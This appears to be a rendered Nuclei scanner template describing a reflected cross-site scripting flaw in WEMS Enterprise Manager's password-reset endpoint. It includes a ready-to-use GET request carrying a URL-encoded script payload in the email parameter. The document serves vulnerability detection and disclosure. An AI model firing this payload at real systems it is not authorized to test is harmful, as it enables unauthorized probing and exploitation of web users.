# Nuclei Template: WEMS Enterprise Manager - Cross-Site Scripting
**Template ID:** wems-manager-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** High
**CWE:** CWE-79
**Source:** Nuclei Template (`wems-manager-xss.yaml`)

## Vulnerability Information & PoC

## Description
WEMS Enterprise Manager contains a cross-site scripting vulnerability via the /guest/users/forgotten endpoint and the email parameter, which allows a remote attacker to inject arbitrary JavaScript into the response return by the server.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/guest/users/forgotten?email=%22%3E%3Cscript%3Econfirm(document.domain)%3C/script%3E
```

## References
- https://packetstormsecurity.com/files/155777/WEMS-Enterprise-Manager-2.58-Cross-Site-Scripting.html
